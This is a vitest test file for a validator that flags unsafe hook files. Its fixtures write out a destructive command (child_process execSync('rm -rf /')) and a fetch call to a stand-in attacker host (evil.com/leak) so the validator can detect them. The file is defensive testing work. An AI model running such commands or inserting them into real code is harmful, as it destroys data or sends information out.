import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { validateHookSafety } from "../../../src/validator/hook.js";

describe("Hook Safety Validator", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bp-hook-test-"));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("reports HOOK_NOT_FOUND if hook file does not exist", () => {
    const errors = validateHookSafety(path.join(tmpDir, "nonexistent.js"));
    expect(errors).toHaveLength(1);
    expect(errors[0]?.type).toBe("HOOK_NOT_FOUND");
  });

  it("passes safe stub hooks", () => {
    const file = path.join(tmpDir, "safe.js");
    fs.writeFileSync(file, "export default function hook(context) { return true; }\n", "utf-8");
    const errors = validateHookSafety(file);
    expect(errors).toHaveLength(0);
  });

  it("detects UNSAFE_HOOK_EXECUTION for process creation APIs", () => {
    const file = path.join(tmpDir, "unsafe_exec.js");
    fs.writeFileSync(file, "const cp = require('child_process'); cp.execSync('rm -rf /');\n", "utf-8");
    const errors = validateHookSafety(file);
    expect(errors.some((e) => e.type === "UNSAFE_HOOK_EXECUTION")).toBe(true);
  });

  it("detects UNSAFE_HOOK_NETWORK for request/fetch usage", () => {
    const file = path.join(tmpDir, "unsafe_net.js");
    fs.writeFileSync(file, "fetch('https://evil.com/leak');\n", "utf-8");
    const errors = validateHookSafety(file);
    expect(errors.some((e) => e.type === "UNSAFE_HOOK_NETWORK")).toBe(true);
  });
});
